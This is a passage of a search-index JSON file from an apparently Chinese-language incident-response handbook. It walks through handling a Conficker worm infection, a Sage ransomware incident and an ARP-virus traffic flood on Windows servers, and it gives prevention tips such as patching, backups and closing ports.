3\u3001\u5b9a\u671f\u5bf9windows\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff0c\u4e0d\u7ed9\u75c5\u6bd2\u53ef\u4e58\u4e4b\u673a 4\u3001\u505a\u597d\u91cd\u8981\u6587\u4ef6\u7684\u5907\u4efd\uff0c\u5907\u4efd\uff0c\u5907\u4efd\u3002","title":"\u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u7b2c2\u7bc7\u8815\u866b\u75c5\u6bd2","text":"","title":"\u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#0x00-\u524d\u8a00","text":"\u200b \u8815\u866b\u75c5\u6bd2\u662f\u4e00\u79cd\u5341\u5206\u53e4\u8001\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\uff0c\u5b83\u662f\u4e00\u79cd\u81ea\u5305\u542b\u7684\u7a0b\u5e8f\uff08\u6216\u662f\u4e00\u5957\u7a0b\u5e8f\uff09\uff0c\u901a\u5e38\u901a\u8fc7\u7f51\u7edc\u9014\u5f84\u4f20\u64ad\uff0c\u6bcf\u5165\u4fb5\u5230\u4e00\u53f0\u65b0\u7684\u8ba1\u7b97\u673a\uff0c\u5b83\u5c31\u5728\u8fd9\u53f0\u8ba1\u7b97\u673a\u4e0a\u590d\u5236\u81ea\u5df1\uff0c\u5e76\u81ea\u52a8\u6267\u884c\u5b83\u81ea\u8eab\u7684\u7a0b\u5e8f\u3002 \u5e38\u89c1\u7684\u8815\u866b\u75c5\u6bd2\uff1a\u718a\u732b\u70e7\u9999\u75c5\u6bd2 \u3001\u51b2\u51fb\u6ce2/\u9707\u8361\u6ce2\u75c5\u6bd2\u3001conficker\u75c5\u6bd2\u7b49\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u67d0\u5929\u65e9\u4e0a\uff0c\u7ba1\u7406\u5458\u5728\u51fa\u53e3\u9632\u706b\u5899\u53d1\u73b0\u5185\u7f51\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u5883\u5916IP\u53d1\u8d77\u4e3b\u52a8\u8fde\u63a5\uff0c\u5185\u7f51\u73af\u5883\uff0c\u65e0\u6cd5\u8fde\u901a\u5916\u7f51\uff0c\u65e0\u56fe\u8111\u8865\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#0x02-\u4e8b\u4ef6\u5206\u6790","text":"\u5728\u51fa\u53e3\u9632\u706b\u5899\u770b\u5230\u7684\u670d\u52a1\u5668\u5185\u7f51IP\uff0c\u9996\u5148\u5c06\u4e2d\u75c5\u6bd2\u7684\u4e3b\u673a\u4ece\u5185\u7f51\u65ad\u5f00\uff0c\u7136\u540e\u767b\u5f55\u8be5\u670d\u52a1\u5668\uff0c\u6253\u5f00D\u76fe_web\u67e5\u6740\u67e5\u770b\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u672c\u5730\u5411\u5916\u7f51IP\u53d1\u8d77\u5927\u91cf\u7684\u4e3b\u52a8\u8fde\u63a5\uff1a \u901a\u8fc7\u7aef\u53e3\u5f02\u5e38\uff0c\u8ddf\u8e2a\u8fdb\u7a0bID\uff0c\u53ef\u4ee5\u627e\u5230\u8be5\u5f02\u5e38\u7531svchost.exe windows\u670d\u52a1\u4e3b\u8fdb\u7a0b\u5f15\u8d77\uff0csvchost.exe\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42\uff1a \u8fd9\u91cc\u6211\u4eec\u63a8\u6d4b\u53ef\u4ee5\u7cfb\u7edf\u8fdb\u7a0b\u88ab\u75c5\u6bd2\u611f\u67d3\uff0c\u4f7f\u7528\u5361\u5df4\u65af\u57fa\u75c5\u6bd2\u67e5\u6740\u5de5\u5177\uff0c\u5bf9\u5168\u76d8\u6587\u4ef6\u8fdb\u884c\u67e5\u6740\uff0c\u53d1\u73b0c:\\windows\\system32\\qntofmhz.dll\u5f02\u5e38\uff1a \u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\uff08 http://www.virscan.org/ \uff09 \u5bf9\u8be5\u6587\u4ef6\u8fdb\u884c\u626b\u63cf: \u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\uff0c\u4e0b\u8f7dconficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u695a\u75c5\u6bd2\u3002 \u5927\u81f4\u7684\u5904\u7406\u6d41\u7a0b\u5982\u4e0b: 1\u3001\u53d1\u73b0\u5f02\u5e38\uff1a\u51fa\u53e3\u9632\u706b\u5899\u3001\u672c\u5730\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u4e3b\u52a8\u5411\u5916\u7f51\u53d1\u8d77\u5927\u91cf\u8fde\u63a5 2\u3001\u75c5\u6bd2\u67e5\u6740\uff1a\u5361\u5df4\u65af\u57fa\u5168\u76d8\u626b\u63cf\uff0c\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6 3\u3001\u786e\u8ba4\u75c5\u6bd2\uff1a\u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u5bf9\u8be5\u6587\u4ef6\u626b\u63cf\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\u3002 4\u3001\u75c5\u6bd2\u5904\u7406\uff1a\u4f7f\u7528conficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u9664\u75c5\u6bd2\u3002","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#0x04-\u9884\u9632\u5904\u7406\u63aa\u65bd","text":"\u200b \u5728\u653f\u5e9c\u3001\u533b\u9662\u5185\u7f51\uff0c\u4f9d\u7136\u5b58\u5728\u7740\u4e00\u4e9b\u5f88\u53e4\u8001\u7684\u611f\u67d3\u6027\u75c5\u6bd2\uff0c\u5982\u4f55\u4fdd\u62a4\u7535\u8111\u4e0d\u53d7\u75c5\u6bd2\u611f\u67d3\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u4e0d\u4f7f\u7528\u6765\u5386\u4e0d\u660e\u7684\u8f6f\u4ef6\uff0c\u4e0d\u968f\u610f\u63a5\u5165\u672a\u7ecf\u67e5\u6740\u7684U\u76d8 3\u3001\u5b9a\u671f\u5bf9windows\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff0c\u4e0d\u7ed9\u75c5\u6bd2\u53ef\u4e58\u4e4b\u673a 4\u3001\u505a\u597d\u91cd\u8981\u6587\u4ef6\u7684\u5907\u4efd\uff0c\u5907\u4efd\uff0c\u5907\u4efd\u3002","title":"0x04 \u9884\u9632\u5904\u7406\u63aa\u65bd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/","text":"\u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b \u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u4e00\u79cd\u65b0\u578b\u7535\u8111\u75c5\u6bd2\uff0c\u4e3b\u8981\u4ee5\u90ae\u4ef6\u3001\u7a0b\u5e8f\u6728\u9a6c\u3001\u7f51\u9875\u6302\u9a6c\u7684\u5f62\u5f0f\u8fdb\u884c\u4f20\u64ad\u3002\u8be5\u75c5\u6bd2\u6027\u8d28\u6076\u52a3\u3001\u5371\u5bb3\u6781\u5927\uff0c\u4e00\u65e6\u611f\u67d3\u5c06\u7ed9\u7528\u6237\u5e26\u6765\u65e0\u6cd5\u4f30\u91cf\u7684\u635f\u5931\u3002\u8fd9\u79cd\u75c5\u6bd2\u5229\u7528\u5404\u79cd\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u6587\u4ef6\u8fdb\u884c\u52a0\u5bc6\uff0c\u88ab\u611f\u67d3\u8005\u4e00\u822c\u65e0\u6cd5\u89e3\u5bc6\uff0c\u5fc5\u987b\u62ff\u5230\u89e3\u5bc6\u7684\u79c1\u94a5\u624d\u6709\u53ef\u80fd\u7834\u89e3\u3002\u81eaWannaCry\u52d2\u7d22\u75c5\u6bd2\u5728\u5168\u7403\u7206\u53d1\u4e4b\u540e\uff0c\u5404\u79cd\u53d8\u79cd\u53ca\u65b0\u578b\u52d2\u7d22\u75c5\u6bd2\u5c42\u51fa\u4e0d\u7a77\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u67d0\u5929\u65e9\u4e0a\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u6253\u5f00OA\u7cfb\u7edf\uff0c\u9996\u9875\u8bbf\u95ee\u5f02\u5e38\uff0c\u663e\u793a\u4e71\u7801\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u200b \u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u90fd\u88ab\u52a0\u5bc6\u4e3a.sage\u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a!HELP_SOS.hta\u6587\u4ef6\uff0c\u6253\u5305\u4e86\u90e8\u5206\u6837\u672c\uff1a \u6253\u5f00!HELP_SOS.hta\u6587\u4ef6\uff0c\u663e\u793a\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u57fa\u672c\u53ef\u4ee5\u786e\u8ba4\u662f\u670d\u52a1\u5668\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u4e0a\u4f20\u6837\u672c\u5230360\u52d2\u7d22\u75c5\u6bd2\u7f51\u7ad9\uff08 http://lesuobingdu.360.cn \uff09\u8fdb\u884c\u5206\u6790\uff1a\u786e\u8ba4web\u670d\u52a1\u5668\u4e2d\u4e86sage\u52d2\u7d22\u75c5\u6bd2\uff0c\u76ee\u524d\u6682\u65f6\u65e0\u6cd5\u89e3\u5bc6\u3002 \u7edd\u5927\u591a\u6570\u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u65e0\u6cd5\u89e3\u5bc6\u7684\uff0c\u4e00\u65e6\u88ab\u52a0\u5bc6\uff0c\u5373\u4f7f\u652f\u4ed8\u4e5f\u4e0d\u4e00\u5b9a\u80fd\u591f\u83b7\u5f97\u89e3\u5bc6\u5bc6\u94a5\u3002\u5728\u5e73\u65f6\u8fd0\u7ef4\u4e2d\u5e94\u79ef\u6781\u505a\u597d\u5907\u4efd\u5de5\u4f5c\uff0c\u6570\u636e\u5e93\u4e0e\u6e90\u7801\u5206\u79bb\uff08\u7c7b\u4f3cOA\u7cfb\u7edf\u9644\u4ef6\u8d44\u6e90\u4e5f\u5f88\u91cd\u8981\uff0c\u4e5f\u8981\u5907\u4efd\uff09\u3002 \u9047\u5230\u4e86\uff0c\u522b\u6025\uff0c\u8bd5\u4e00\u8bd5\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\uff1a \u201c\u62d2\u7edd\u52d2\u7d22\u8f6f\u4ef6\u201d\u7f51\u7ad9 https://www.nomoreransom.org/zh/index.html 360\u5b89\u5168\u536b\u58eb\u52d2\u7d22\u75c5\u6bd2\u4e13\u9898 http://lesuobingdu.360.cn 0x04 \u9632\u8303\u63aa\u65bd \u00b6 \u200b \u4e00\u65e6\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u6587\u4ef6\u4f1a\u88ab\u9501\u6b7b\uff0c\u6ca1\u6709\u529e\u6cd5\u6b63\u5e38\u8bbf\u95ee\u4e86\uff0c\u8fd9\u65f6\u5019\uff0c\u4f1a\u7ed9\u4f60\u5e26\u6765\u6781\u5927\u7684\u56f0\u607c\u3002\u4e3a\u4e86\u9632\u8303\u8fd9\u6837\u7684\u4e8b\u60c5\u51fa\u73b0\uff0c\u6211\u4eec\u7535\u8111\u4e0a\u8981\u5148\u505a\u597d\u4e00\u4e9b\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u4fdd\u6301\u76d1\u63a7\u5f00\u542f\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3\uff0c\u5982445\u3001135\u3001137\u3001138\u3001139\u30013389\u7b49\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6 4\u3001\u5907\u4efd\u3002\u91cd\u8981\u7684\u8d44\u6599\u4e00\u5b9a\u8981\u5907\u4efd\uff0c\u8c28\u9632\u8d44\u6599\u4e22\u5931 5\u3001\u5f3a\u5316\u7f51\u7edc\u5b89\u5168\u610f\u8bc6\uff0c\u964c\u751f\u94fe\u63a5\u4e0d\u70b9\u51fb\uff0c\u964c\u751f\u6587\u4ef6\u4e0d\u8981\u4e0b\u8f7d\uff0c\u964c\u751f\u90ae\u4ef6\u4e0d\u8981\u6253\u5f00","title":"\u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/#\u7b2c3\u7bc7\u52d2\u7d22\u75c5\u6bd2","text":"","title":"\u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/#0x00-\u524d\u8a00","text":"\u200b \u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u4e00\u79cd\u65b0\u578b\u7535\u8111\u75c5\u6bd2\uff0c\u4e3b\u8981\u4ee5\u90ae\u4ef6\u3001\u7a0b\u5e8f\u6728\u9a6c\u3001\u7f51\u9875\u6302\u9a6c\u7684\u5f62\u5f0f\u8fdb\u884c\u4f20\u64ad\u3002\u8be5\u75c5\u6bd2\u6027\u8d28\u6076\u52a3\u3001\u5371\u5bb3\u6781\u5927\uff0c\u4e00\u65e6\u611f\u67d3\u5c06\u7ed9\u7528\u6237\u5e26\u6765\u65e0\u6cd5\u4f30\u91cf\u7684\u635f\u5931\u3002\u8fd9\u79cd\u75c5\u6bd2\u5229\u7528\u5404\u79cd\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u6587\u4ef6\u8fdb\u884c\u52a0\u5bc6\uff0c\u88ab\u611f\u67d3\u8005\u4e00\u822c\u65e0\u6cd5\u89e3\u5bc6\uff0c\u5fc5\u987b\u62ff\u5230\u89e3\u5bc6\u7684\u79c1\u94a5\u624d\u6709\u53ef\u80fd\u7834\u89e3\u3002\u81eaWannaCry\u52d2\u7d22\u75c5\u6bd2\u5728\u5168\u7403\u7206\u53d1\u4e4b\u540e\uff0c\u5404\u79cd\u53d8\u79cd\u53ca\u65b0\u578b\u52d2\u7d22\u75c5\u6bd2\u5c42\u51fa\u4e0d\u7a77\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u67d0\u5929\u65e9\u4e0a\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u6253\u5f00OA\u7cfb\u7edf\uff0c\u9996\u9875\u8bbf\u95ee\u5f02\u5e38\uff0c\u663e\u793a\u4e71\u7801\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/#0x02-\u4e8b\u4ef6\u5206\u6790","text":"\u200b \u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u90fd\u88ab\u52a0\u5bc6\u4e3a.sage\u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a!HELP_SOS.hta\u6587\u4ef6\uff0c\u6253\u5305\u4e86\u90e8\u5206\u6837\u672c\uff1a \u6253\u5f00!HELP_SOS.hta\u6587\u4ef6\uff0c\u663e\u793a\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u57fa\u672c\u53ef\u4ee5\u786e\u8ba4\u662f\u670d\u52a1\u5668\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u4e0a\u4f20\u6837\u672c\u5230360\u52d2\u7d22\u75c5\u6bd2\u7f51\u7ad9\uff08 http://lesuobingdu.360.cn \uff09\u8fdb\u884c\u5206\u6790\uff1a\u786e\u8ba4web\u670d\u52a1\u5668\u4e2d\u4e86sage\u52d2\u7d22\u75c5\u6bd2\uff0c\u76ee\u524d\u6682\u65f6\u65e0\u6cd5\u89e3\u5bc6\u3002 \u7edd\u5927\u591a\u6570\u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u65e0\u6cd5\u89e3\u5bc6\u7684\uff0c\u4e00\u65e6\u88ab\u52a0\u5bc6\uff0c\u5373\u4f7f\u652f\u4ed8\u4e5f\u4e0d\u4e00\u5b9a\u80fd\u591f\u83b7\u5f97\u89e3\u5bc6\u5bc6\u94a5\u3002\u5728\u5e73\u65f6\u8fd0\u7ef4\u4e2d\u5e94\u79ef\u6781\u505a\u597d\u5907\u4efd\u5de5\u4f5c\uff0c\u6570\u636e\u5e93\u4e0e\u6e90\u7801\u5206\u79bb\uff08\u7c7b\u4f3cOA\u7cfb\u7edf\u9644\u4ef6\u8d44\u6e90\u4e5f\u5f88\u91cd\u8981\uff0c\u4e5f\u8981\u5907\u4efd\uff09\u3002 \u9047\u5230\u4e86\uff0c\u522b\u6025\uff0c\u8bd5\u4e00\u8bd5\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\uff1a \u201c\u62d2\u7edd\u52d2\u7d22\u8f6f\u4ef6\u201d\u7f51\u7ad9 https://www.nomoreransom.org/zh/index.html 360\u5b89\u5168\u536b\u58eb\u52d2\u7d22\u75c5\u6bd2\u4e13\u9898 http://lesuobingdu.360.cn","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/#0x04-\u9632\u8303\u63aa\u65bd","text":"\u200b \u4e00\u65e6\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u6587\u4ef6\u4f1a\u88ab\u9501\u6b7b\uff0c\u6ca1\u6709\u529e\u6cd5\u6b63\u5e38\u8bbf\u95ee\u4e86\uff0c\u8fd9\u65f6\u5019\uff0c\u4f1a\u7ed9\u4f60\u5e26\u6765\u6781\u5927\u7684\u56f0\u607c\u3002\u4e3a\u4e86\u9632\u8303\u8fd9\u6837\u7684\u4e8b\u60c5\u51fa\u73b0\uff0c\u6211\u4eec\u7535\u8111\u4e0a\u8981\u5148\u505a\u597d\u4e00\u4e9b\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u4fdd\u6301\u76d1\u63a7\u5f00\u542f\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3\uff0c\u5982445\u3001135\u3001137\u3001138\u3001139\u30013389\u7b49\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6 4\u3001\u5907\u4efd\u3002\u91cd\u8981\u7684\u8d44\u6599\u4e00\u5b9a\u8981\u5907\u4efd\uff0c\u8c28\u9632\u8d44\u6599\u4e22\u5931 5\u3001\u5f3a\u5316\u7f51\u7edc\u5b89\u5168\u610f\u8bc6\uff0c\u964c\u751f\u94fe\u63a5\u4e0d\u70b9\u51fb\uff0c\u964c\u751f\u6587\u4ef6\u4e0d\u8981\u4e0b\u8f7d\uff0c\u964c\u751f\u90ae\u4ef6\u4e0d\u8981\u6253\u5f00","title":"0x04 \u9632\u8303\u63aa\u65bd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/","text":"\u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 ARP\u75c5\u6bd2\u5e76\u4e0d\u662f\u67d0\u4e00\u79cd\u75c5\u6bd2\u7684\u540d\u79f0\uff0c\u800c\u662f\u5bf9\u5229\u7528arp\u534f\u8bae\u7684\u6f0f\u6d1e\u8fdb\u884c\u4f20\u64ad\u7684\u4e00\u7c7b\u75c5\u6bd2\u7684\u603b\u79f0\uff0c\u76ee\u524d\u5728\u5c40\u57df\u7f51\u4e2d\u8f83\u4e3a\u5e38\u89c1\u3002\u53d1\u4f5c\u7684\u65f6\u5019\u4f1a\u5411\u5168\u7f51\u53d1\u9001\u4f2a\u9020\u7684ARP\u6570\u636e\u5305\uff0c\u4e25\u91cd\u5e72\u6270\u5168\u7f51\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u5176\u5371\u5bb3\u751a\u81f3\u6bd4\u4e00\u4e9b\u8815\u866b\u75c5\u6bd2\u8fd8\u8981\u4e25\u91cd\u5f97\u591a\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\u65e9\u4e0a\uff0c\u5c0f\u4f19\u4f34\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u5fae\u4fe1\uff0c\u8bf4192.168.64.76 CPU\u73b0\u5728\u8d1f\u8f7d\u5f88\u9ad8\uff0c\u5728\u65e5\u5fd7\u5206\u6790\u5e73\u53f0\u67e5\u770b\u4e86\u4e00\u4e0b\u8fd9\u53f0\u670d\u52a1\u5668\u7684\u76f8\u5173\u65e5\u5fd7\uff0c\u6d41\u91cf\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\u66b4\u6da8\uff0c\u53d1\u73b0\u5927\u91cf137\u7aef\u53e3\u7684UDP\u653b\u51fb\u3002 0x02 \u5206\u6790\u8fc7\u7a0b \u00b6 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u9996\u5148\u67e5\u770b137\u7aef\u53e3\u5bf9\u5e94\u7684\u8fdb\u7a0b\uff0c\u8fdb\u7a0bID\u4e3a4\u5bf9\u5e94\u7684\u8fdb\u7a0b\u662fSYSTEM\uff0c\u4e8e\u662f\u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u5168\u76d8\u67e5\u6740\u3002 \u5361\u5df4\u65af\u57fa\u7eff\u8272\u7248\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \u5361\u5df4\u65af\u57fa\u3001360\u6740\u6bd2\u3001McAfee\u67e5\u6740\u65e0\u679c\uff0c\u624b\u5de5\u5c06\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1\u9879\u90fd\u7ffb\u4e86\u4e00\u904d\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u3002 \u672c\u5730\u4e0b\u8f7d\u4e86IpTool\u6293\u5305\u5de5\u5177\uff0c\u7b5b\u9009\u6761\u4ef6\uff1a \u534f\u8bae UDP \u7aef\u53e3 137 \u53ef\u4ee5\u660e\u663e\u7684\u770b\u51fa192.168.64.76\u53d1\u9001\u7684\u6570\u636e\u5305\u662f\u5f02\u5e38\u7684\uff0c192.168.64.76\u7684\u6570\u636e\u5305\u76ee\u7684\u5730\u5740\uff0c\u4e00\u76f4\u5728\u53d8\uff0c\u76ee\u7684MAC\u662f\u4e0d\u53d8\u7684\uff0c\u800c\u8fd9\u4e2aMAC\u5730\u5740\u5c31\u662f\u7f51\u5173\u7684MAC\u3002 \u7aef\u53e3137\u7684udp\u5305\u662fnetbios\u7684\u5e7f\u64ad\u5305\uff0c\u731c\u6d4b\uff1a\u53ef\u80fd\u662fARP\u75c5\u6bd2\uff0c\u7531\u672c\u673a\u5bf9\u5916\u7684ARP\u653b\u51fb\u3002 \u91c7\u7528\u63aa\u65bd\uff1a\u901a\u8fc7\u501f\u52a9\u4e00\u4e9b\u5b89\u5168\u8f6f\u4ef6\u6765\u5b9e\u73b0\u5c40\u57df\u7f51ARP\u68c0\u6d4b\u53ca\u9632\u5fa1\u529f\u80fd\u3002 \u670d\u52a1\u5668\u5b89\u5168\u72d7Windows\u7248\u4e0b\u8f7d\uff1a http://free.safedog.cn/server_safedog.html \u7f51\u7edc\u9632\u706b\u5899--\u653b\u51fb\u9632\u62a4--ARP\u9632\u706b\u5899\uff1a \u867d\u7136\u6709\u62e6\u622a\u4e86\u90e8\u5206ARP\u8bf7\u6c42\uff0c\u4f46\u6d41\u91cf\u51fa\u53e3\u8fd8\u662f\u6709\u4e00\u4e9b137 UDF\u7684\u6570\u636e\u5305\u3002 \u770b\u6765\u8fd8\u662f\u5f97\u4e0b\u72e0\u62db\uff0c\u5173\u95ed137\u7aef\u53e3\uff1a\u7981\u7528TCP/IP\u4e0a\u7684NetBIOS\u3002 1\uff09\u3001\u7981\u7528Server\u670d\u52a1 2\uff09\u3001\u7981\u7528 TCP/IP \u4e0a\u7684 NetBIOS 